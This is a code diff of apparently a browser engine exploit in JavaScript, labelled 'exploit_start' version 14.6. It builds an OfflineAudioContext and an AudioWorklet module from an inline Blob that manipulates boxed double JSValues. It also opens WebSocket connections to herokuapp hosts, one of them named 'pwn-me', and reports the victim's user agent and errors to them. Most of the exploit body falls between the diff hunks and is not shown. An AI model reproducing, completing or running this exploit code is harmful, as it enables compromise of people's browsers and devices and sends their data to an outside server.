@@ -1,16 +1,15 @@
-var io = require("socket.io");
-var socket = new WebSocket("wss://pwn-me.herokuapp.com/")
+var socket = new WebSocket("wss://slug-detected.herokuapp.com/")
 
 var keep = [];
 async function kickstart146() {
-	socket.send("exploit_start", {
+	socket.send(`exploit_start {
 		exploitVersion: "14.6",
-		userAgent: navigator.userAgent,
-	});
+		userAgent: ${navigator.userAgent},
+	}`);
 	var context = new OfflineAudioContext(1, 128, 300000);
 	context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
       // constant added to double JSValues
-      var socket = new WebSocket("wss://pwn-me.herokuapp.com/")
+      var socket = new WebSocket("wss://pwn-me.herokuapp.com/");
       const kBoxedDoubleOffset = 0x0002000000000000n;
       function boxDouble(d) {
         return d + kBoxedDoubleOffset;
@@ -184,5 +183,3 @@ async function kickstart146() {
         socket.send("log_normal", "Error: " + err);
     });
 }
-
-export default kickstart146;
